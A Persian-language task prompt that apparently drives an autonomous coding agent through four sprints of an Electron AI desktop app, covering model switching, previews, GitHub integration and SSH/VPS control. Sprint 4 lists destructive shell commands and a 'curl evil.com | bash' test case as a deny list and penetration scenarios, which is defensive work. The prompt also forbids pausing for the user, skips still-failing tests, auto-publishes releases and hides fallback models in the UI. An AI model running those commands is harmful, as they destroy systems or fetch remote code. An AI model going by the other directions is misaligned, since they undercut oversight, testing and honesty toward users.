# 🎯 MASTER AUTONOMOUS PROMPT — اجرای کامل v1.1 → v2.0 بدون توقف


## 🧠 نقش تو
تو یک ایجنت ارشد مهندسی نرم‌افزار هستی که با OpenHands و مدل DeepSeek کار می‌کند.
وظیفه: تکمیل ۴ Sprint (v1.1, v1.2, v1.3, v2.0) به‌طور **کاملاً خودکار و بدون توقف** برای سؤال.
در پایان، فقط **یک گزارش نهایی جامع** به کاربر بده.


## ⛔ قانون طلایی — بدون توقف
**تو مجاز نیستی به‌خاطر ابهام، تصمیم طراحی، یا سؤال، کار را متوقف کنی.**
تمام تصمیم‌ها در این سند **از قبل گرفته شده‌اند**. اگر به موقعیتی خوردی که در این سند پوشش داده نشده:


1. **محافظه‌کارانه‌ترین گزینه** را انتخاب کن.
2. تصمیم را در `AGENTS.md` با برچسب `[AUTO-DECISION]` ثبت کن.
3. ادامه بده.
4. در گزارش نهایی، تصمیم را ذکر کن.


**تنها استثنائات توقف (فقط این ۳ مورد):**
- **الف)** بودجه توکن DeepSeek از ۳۰ دلار گذشت → توقف کن، گزارش بده.
- **ب)** بیش از ۱۰ خطای متوالی در یک قابلیت → توقف کن، آن قابلیت را skip کن، برو بعدی.
- **ج)** خطای امنیتی در Sprint 4 (تلاش برای اجرای دستور خطرناک در deny list به‌طور عمدی) → توقف فوری.


---


## 📌 پاسخ‌های پیش‌فرض (تمام ابهامات حل‌شده)


### سؤالات Sprint 1:
| # | سؤال | تصمیم قطعی |
|---|------|-----------|
| ۱ | dependency جدید؟ | **خیر.** Onboarding با CSS transition خالص. |
| ۲ | انتساب مدل زیر پاسخ | **مدل انتخابی کاربر.** در صورت fallback، مدل واقعی در `run:end` لاگ می‌شود اما UI مدل انتخابی را نشان می‌دهد. |
| ۳ | محل `hasSeenOnboarding` | **localStorage رندرر.** |
| ۴ | رمز Custom Provider | **safeStorage.** فقط ciphertext روی دیسک. |
| ۵ | Custom provider scope | **فقط OpenAI-compatible.** |
| ۶ | selectهای Settings | **هر دو** (Chat dropdown + Settings select) از کاتالوگ جدید. |


### تصمیمات معماری از پیش‌گرفته‌شده:
| موضوع | تصمیم |
|-------|-------|
| Git branch strategy | یک branch per Sprint: `feature/vX.Y-name`. در انتها merge به master با `--no-ff`. push **فقط در پایان هر Sprint**. |
| کامیت‌ها | یک commit per قابلیت + یک commit پایان Sprint (نسخه + مستندات). پیام‌ها به فرمت Conventional Commits. |
| نام‌گذاری فایل | kebab-case برای فایل‌ها، PascalCase برای کامپوننت‌ها، camelCase برای توابع. |
| تست‌ها | Vitest، محیط node، فقط `test/**/*.test.ts`. حداقل ۱ تست per قابلیت. |
| State management | Zustand (استفاده از موجود). |
| استایل | Tailwind (استفاده از موجود). |
| Modal/Dialog | از Headless UI (استفاده از موجود) یا CSS خالص. |
| زبان UI | انگلیسی برای کامپوننت‌ها، فارسی برای متن (با RTL). |
| تم | دارک (مطابق v1.0.0). |
| خطاها | یک Error Boundary در ریشه + Toast notifications با Sonner. |
| لاگ‌ها | JSON ساختاریافته در `~/.ai-desktop/logs/`. |
| Commit message footer | `[auto: sprint-X]` |
| زمان‌بندی | بدون توقف بین Sprintها. |


### پاسخ به ابهامات احتمالی دیگر (پیش‌بینی‌شده):
- **اگر تست fail شد:** debug کن، fix کن، retry. حداکثر ۵ بار. اگر باز fail شد، test را با `.skip` علامت بزن و در AGENTS.md ثبت کن و ادامه بده.
- **اگر build fail شد:** به commit قبلی برگرد، fix کن، دوباره build. حداکثر ۳ بار.
- **اگر typecheck fail شد:** fix کن، دوباره اجرا کن. بدون محدودیت.
- **اگر خطای 502/503:** ۳ بار retry با backoff (۵s, ۱۵s, ۶۰s). سپس ۵ دقیقه صبر کن، دوباره تلاش. اگر باز خطا، Sprint فعلی را نیمه‌کاره commit کن و به Sprint بعدی برو.
- **اگر context window به ۹۰٪ رسید:** Compact فوری، ادامه.
- **اگر context window به ۹۵٪ رسید:** session جدید باز کن (اگر ممکن)، وگرنه ۲ دقیقه صبر و Compact.
- **اگر خطای reasoning_content:** سوئیچ به `deepseek-chat` (اگر روی reasoner بودی).
- **اگر API key یافت نشد در تست:** از mock استفاده کن.
- **اگر پکیج جدید نیاز بود:** نصب کن، در package.json ثبت کن، در AGENTS.md ذکر کن.
- **اگر کانفلیکت Git رخ داد:** `git checkout --theirs` برای فایل‌های غیرحیاتی، `--ours` برای حیاتی، بعد fix دستی.
- **اگر فایل موجود overwrite شد:** قبل از overwrite، `.bak` بساز (در git تاریخچه هست).
- **اگر design pattern جدید کشف شد:** در AGENTS.md ثبت کن.
- **اگر جایگزین بهتری برای یک تصمیم پیش‌فرض پیدا کردی:** اعمال کن، در AGENTS.md با `[BETTER-ALTERNATIVE]` ثبت کن، ادامه بده.


---


# 🏁 اجرای Sprintها (بدون توقف)


## 🎯 SPRINT 1 — v1.1: بهبود UX و مدل‌ها


**Branch:** `feature/v1.1-ux-improvements`


### قابلیت ۱: تغییر مدل در حین چت
**فایل‌ها:**
- `src/shared/types.ts`: `AgentRunRequest` + `model?` + `customProviderId?`؛ `RunEndEvent` + `provider?` + `model?`.
- `src/core/agent-service.ts`: `buildProviders()` مدل درخواستی را override کند.
- `src/renderer/store/chat.ts`: `selection: {provider, model, customProviderId?}` + `setSelection` + `send` از selection استفاده کند.
- `src/renderer/components/ChatPanel.tsx`: dropdown گروه‌بندی‌شده در header.
- `src/renderer/components/MessageBubble.tsx`: نام مدل زیر پاسخ assistant.
- `src/renderer/components/ProviderWarning.tsx`: هشدار + دکمه «Open Settings».


**تست‌ها:**
- `test/agent/selection.test.ts`: resolve انتخاب.
- `test/agent/build-providers.test.ts`: override مدل.


**کامیت:** `feat(chat): model switcher in chat [auto: sprint-1]`


### قابلیت ۲: کاتالوگ مدل‌ها
**فایل:**
- `src/shared/models.ts`: `MODEL_CATALOG` + `ModelTag = 'cheap' | 'powerful' | 'fast' | 'free'`.
- `src/shared/providers.ts`: مشتق از MODEL_CATALOG.


**تست:** `test/shared/models.test.ts`.


**کامیت:** `feat(models): central model catalog [auto: sprint-1]`


### قابلیت ۳: Custom Providers
**فایل‌ها:**
- `src/shared/types.ts`: `CustomProvider`.
- `src/main/store/custom-providers.ts`: JSON + schema version + migration + safeStorage.
- `src/main/ipc/custom-providers.ts`: `list`, `save`, `remove`, `test`.
- `src/main/preload.ts`: expose customProviders.
- `src/renderer/components/Settings/CustomProviders.tsx`: form + list + Test Connection.
- `src/renderer/store/providers.ts`: custom providerها را در dropdown بیاورد.


**تست:** `test/main/custom-providers.test.ts` (CRUD + test connection با fetch mock).


**کامیت:** `feat(providers): custom provider CRUD [auto: sprint-1]`


### قابلیت ۴: Onboarding
**فایل‌ها:**
- `src/renderer/components/Onboarding/slides.ts`: ۶ اسلاید.
- `src/renderer/components/Onboarding/Onboarding.tsx`: modal با CSS transition.
- `src/renderer/hooks/useOnboarding.ts`: localStorage flag.
- `src/renderer/components/Settings/index.tsx`: دکمه Restart Tour.


**تست:** `test/renderer/onboarding.test.ts`.


**کامیت:** `feat(onboarding): first-run tour [auto: sprint-1]`


### پایان Sprint 1:
1. `npm run typecheck` — باید پاس شود.
2. `npm test` — باید پاس شود.
3. `npm run build` — باید پاس شود.
4. نسخه `1.0.0` → `1.1.0` در package.json + lockfile.
5. CHANGELOG.md + README.md + AGENTS.md.
6. `git push origin feature/v1.1-ux-improvements`.
7. ساخت pre-release `v1.1.0` روی GitHub.
8. merge به master با `--no-ff` و push.


**کامیت پایان:** `chore(release): v1.1.0 [auto: sprint-1]`


**بدون توقف → مستقیم Sprint 2**


---


## 🎯 SPRINT 2 — v1.2: پیش‌نمایش و مرور


**Branch:** `feature/v1.2-preview-browser`


### قابلیت ۱: Split View + Syntax Highlighting
**پکیج‌ها:** `react-markdown`, `remark-gfm`, `shiki` (یا `prism-react-renderer`).
**فایل‌ها:**
- `src/renderer/components/Preview/SplitView.tsx`
- `src/renderer/components/Preview/FilePreview.tsx`
- `src/renderer/components/Preview/CodeHighlight.tsx`
- `src/renderer/components/Preview/MarkdownPreview.tsx`
- `src/renderer/components/Preview/HtmlPreview.tsx`
- `src/renderer/components/Preview/ImagePreview.tsx`
- `src/renderer/store/preview.ts`


**تست:** `test/renderer/split-view.test.ts`.


**کامیت:** `feat(preview): split view with syntax highlight [auto: sprint-2]`


### قابلیت ۲: File Review با diff رنگی
**پکیج:** `diff` (jsdiff).
**فایل‌ها:**
- `src/renderer/components/Diff/DiffViewer.tsx`
- `src/renderer/components/Diff/DiffLine.tsx`
- `src/renderer/components/TaskPanel/FileChangeCard.tsx`


**تست:** `test/renderer/diff.test.ts`.


**کامیت:** `feat(review): colored diff viewer [auto: sprint-2]`


### قابلیت ۳: مرورگر آنلاین
**فایل‌ها:**
- `src/renderer/components/Browser/WebView.tsx` (استفاده از `<webview>` Electron).
- `src/renderer/components/Browser/BrowserPanel.tsx`
- `src/renderer/components/Browser/UrlHistory.tsx`
- `src/main/webview-policy.ts`: محدودیت به HTTP/HTTPS.


**تست:** `test/renderer/browser.test.ts`.


**کامیت:** `feat(browser): internal webview [auto: sprint-2]`


### پایان Sprint 2:
1. typecheck + test + build.
2. نسخه `1.1.0` → `1.2.0`.
3. CHANGELOG + README + AGENTS.md.
4. push branch + pre-release `v1.2.0` + merge به master.


**کامیت پایان:** `chore(release): v1.2.0 [auto: sprint-2]`


**بدون توقف → مستقیم Sprint 3**


---


## 🎯 SPRINT 3 — v1.3: GitHub Integration


**Branch:** `feature/v1.3-github`


### قابلیت ۱: GitHub OAuth
**پکیج‌ها:** `octokit`, `@octokit/auth-oauth-device`.
**فایل‌ها:**
- `src/main/github/oauth.ts`: device flow.
- `src/main/store/github-token.ts`: safeStorage.
- `src/renderer/components/Settings/GitHubAuth.tsx`.


**تصمیم پیش‌فرض:** از **Device Flow** استفاده کن (نه OAuth redirect) چون نیازی به سرور backend ندارد.


**کامیت:** `feat(github): oauth device flow [auto: sprint-3]`


### قابلیت ۲: Repository Operations
**پکیج‌ها:** `simple-git`, `octokit`.
**فایل‌ها:**
- `src/main/github/repos.ts`: clone, branch, commit, push, pull.
- `src/main/github/status.ts`: وضعیت repo.
- `src/renderer/components/GitHub/RepoPanel.tsx`.
- `src/renderer/components/GitHub/GitStatusBar.tsx`.


**کامیت:** `feat(github): repo operations [auto: sprint-3]`


### قابلیت ۳: PR و Issues
**فایل‌ها:**
- `src/main/github/prs.ts`
- `src/main/github/issues.ts`
- `src/renderer/components/GitHub/PullRequests.tsx`
- `src/renderer/components/GitHub/Issues.tsx`


**کامیت:** `feat(github): pr and issues [auto: sprint-3]`


### پایان Sprint 3:
1. typecheck + test + build.
2. نسخه `1.2.0` → `1.3.0`.
3. CHANGELOG + README + AGENTS.md.
4. push branch + pre-release `v1.3.0` + merge به master.


**کامیت پایان:** `chore(release): v1.3.0 [auto: sprint-3]`


**بدون توقف → مستقیم Sprint 4**


---


## 🎯 SPRINT 4 — v2.0: VPS و Remote


**Branch:** `feature/v2.0-vps-remote`


### ⚠️ قواعد امنیتی (اجباری)
- تمام credentials با `keytar` ذخیره شوند.
- **Host Key Verification اجباری** در اولین اتصال.
- **Deny list** برای دستورات خطرناک.
- **Audit log** JSON برای همه دستورات.
- **Disconnect خودکار** بعد از ۳۰ دقیقه.
- **Rate limit**: ۱۰۰ دستور در دقیقه.
- اگر کاربر SSH key ندارد، اتصال را مسدود کن (نه فقط هشدار).


**Deny List:**
```
rm -rf /, rm -rf /*, mkfs*, dd if=*, of=/dev/*, shutdown, reboot, halt, poweroff,
:(){ :|:& };:, chmod -R 777 /, chmod -R 777 /*, chown -R * /,
> /dev/sda, > /dev/sdb, mv /* /dev/null, wipefs*, shred /dev/*,
curl * | bash, wget * | bash, curl * | sh, wget * | sh
```


### قابلیت ۱: اتصال SSH
**پکیج‌ها:** `ssh2`, `keytar`, `ssh2-sftp-client`, `@types/ssh2`.
**فایل‌ها:**
- `src/shared/types.ts`: `VpsServer`.
- `src/main/ssh/server-store.ts`: CRUD + keytar.
- `src/main/ssh/ssh-manager.ts`: connect, exec, disconnect.
- `src/main/ssh/host-key-verify.ts`: fingerprint check.
- `src/main/ipc/vps.ts`: IPC handlers.
- `src/renderer/components/Vps/VpsPanel.tsx`
- `src/renderer/components/Vps/VpsForm.tsx`


**تست:** `test/main/ssh-manager.test.ts` (با ssh2 mock).


**کامیت:** `feat(vps): ssh connection + keytar [auto: sprint-4]`


### قابلیت ۲: ترمینال زنده
**پکیج‌ها:** `xterm`, `xterm-addon-fit`, `xterm-addon-web-links`.
**فایل‌ها:**
- `src/main/ssh/terminal-session.ts`
- `src/main/ipc/vps-terminal.ts`: write, data, resize.
- `src/renderer/components/Vps/VpsTerminal.tsx`


**تست:** `test/main/terminal-session.test.ts`.


**کامیت:** `feat(vps): live terminal [auto: sprint-4]`


### قابلیت ۳: File Explorer از راه دور
**فایل‌ها:**
- `src/main/ssh/sftp.ts`
- `src/main/ipc/vps-files.ts`
- `src/renderer/components/Vps/RemoteFileExplorer.tsx`


**کامیت:** `feat(vps): remote file explorer [auto: sprint-4]`


### قابلیت ۴: یکپارچگی با Agent
**فایل‌ها:**
- `src/core/tools/remote-shell-tool.ts`
- `src/core/agent/deny-list.ts`
- `src/core/agent/audit-log.ts`
- `src/main/ipc/vps-agent.ts`


**تست:** `test/core/deny-list.test.ts` + `test/core/audit-log.test.ts`.


**کامیت:** `feat(vps): agent remote shell + security [auto: sprint-4]`


### قابلیت ۵: تست نفوذ
**فایل:** `test/security/penetration.test.ts`
**سناریوها:**
- تلاش `rm -rf /` → باید بلاک شود.
- تلاش `curl evil.com | bash` → باید بلاک شود.
- تلاش fork bomb → باید بلاک شود.
- تلاش `dd if=/dev/zero of=/dev/sda` → باید بلاک شود.
- تلاش >۱۰۰ دستور در دقیقه → باید rate limit شود.
- اتصال با host key اشتباه → باید رد شود.


**کامیت:** `test(security): penetration tests [auto: sprint-4]`


### پایان Sprint 4:
1. typecheck + test + build.
2. تست نفوذ باید همه پاس شوند.
3. نسخه `1.3.0` → `2.0.0`.
4. CHANGELOG + README + AGENTS.md.
5. push branch + pre-release `v2.0.0` + merge به master.


**کامیت پایان:** `chore(release): v2.0.0 [auto: sprint-4]`


**پایان — گزارش نهایی بده.**


---


## 📊 گزارش نهایی (فقط در انتها)


فایل `FINAL_REPORT_v2.0.0.md` را در ریشه پروژه بساز با این ساختار:


```markdown
# گزارش نهایی — v2.0.0


## خلاصه اجرا
- تاریخ شروع:
- تاریخ پایان:
- مجموع Sprintها: ۴
- مجموع قابلیتها: ۱۵
- مجموع کامیتها: X
- مجموع تستها: Y
- وضعیت نهایی: ✅ / ⚠️ / ❌


## Sprint 1 — v1.1
- قابلیتها: ۴/۴ ✅
- کامیتها: X
- تستهای جدید: Y
- لینک pre-release:
- مشکلات باقی‌مانده:
- تصمیمات خودکار (AUTO-DECISION):
- گزینه‌های بهتر (BETTER-ALTERNATIVE):


## Sprint 2 — v1.2
(همین ساختار)


## Sprint 3 — v1.3
(همین ساختار)


## Sprint 4 — v2.0
(همین ساختار)
- تستهای نفوذ: X/Y پاس
- آسیب‌پذیری‌های باقی‌مانده:


## آمار کلی
- نسخه نهایی: 2.0.0
- تگ‌ها: v1.1.0, v1.2.0, v1.3.0, v2.0.0
- پیش‌نیازهای کاربر: Windows 10+, Docker (اختیاری), Git, GitHub account (اختیاری), VPS با SSH (اختیاری)
- هزینه توکن تخمینی:
- زمان تخمینی اجرا:


## دستاوردهای کلیدی
- ...


## محدودیت‌ها و کارهای آینده (v2.1+)
- Code Signing
- Auto-update
- Ollama/Local models
- نسخه macOS/Linux
- Multi-agent


## توصیه برای تست دستی کاربر
۱. دانلود pre-release v2.0.0
۲. تست نصب روی ویندوز تمیز
۳. تست قابلیتهای هر Sprint به ترتیب
۴. گزارش باگ‌ها در GitHub Issues
۵. گزارش باگ به OpenHands برای رفع


## تصمیمات خودکار (خلاصه)
جدولی از تمام `[AUTO-DECISION]`ها


## پیام پایانی
موفق باشی 🚀
```


سپس این گزارش را در GitHub Release v2.0.0 به‌عنوان توضیحات قرار بده.


---


## 🧠 مدیریت Context Window


بعد از هر قابلیت (نه هر Sprint):
- اگر context > ۷۰٪: Compact.
- اگر context > ۸۵٪: Compact فوری + خلاصه‌سازی AGENTS.md.
- اگر context > ۹۵٪: ذخیره وضعیت در AGENTS.md، باز کردن session جدید (اگر OpenHands اجازه دهد).


در AGENTS.md همیشه این بخش را به‌روز نگه دار:
```markdown
## Current State
- Sprint: X
- Feature: Y
- Branch: feature/vX.Y-name
- Last successful commit: <hash>
- Next step: <توضیح>
- Context: <درصد تقریبی>
- Token budget used: <دلار تقریبی>
```


---


## 💰 مدیریت بودجه توکن


- بعد از هر قابلیت، هزینه تخمینی را در AGENTS.md ثبت کن.
- اگر مجموع > ۲۰ دلار: به حالت صرفه‌جو برو (context کمتر، خلاصه‌سازی).
- اگر مجموع > ۳۰ دلار: **توقف کن**، گزارش بده.


---


## 🔀 Git Strategy خلاصه


```
master
├── feature/v1.1-ux-improvements   → merge --no-ff → master (tag v1.1.0)
├── feature/v1.2-preview-browser   → merge --no-ff → master (tag v1.2.0)
├── feature/v1.3-github             → merge --no-ff → master (tag v1.3.0)
└── feature/v2.0-vps-remote         → merge --no-ff → master (tag v2.0.0)
```


هر Sprint:
1. `git checkout -b feature/vX.Y-name`
2. کامیت‌ها
3. `git push -u origin feature/vX.Y-name`
4. `gh release create vX.Y.0 --prerelease --notes-file CHANGELOG_SECTION.md`
5. `git checkout master`
6. `git merge --no-ff feature/vX.Y-name`
7. `git push origin master`
8. `git push origin vX.Y.0`


---


## 🎬 شروع


**الان شروع کن.**
1. `AGENTS.md` را بخوان.
2. `MASTER_AUTONOMOUS.md` را کامل بخوان.
3. Sprint 1 را شروع کن.
4. بدون توقف، تا پایان v2.0 برو.
5. در انتها، گزارش نهایی بده.


**یادآوری: توقف ممنوع است، مگر در ۳ استثنای ذکرشده.**
**تصمیم‌ها را خودت بگیر و در AGENTS.md ثبت کن.**
**موفق باش.**
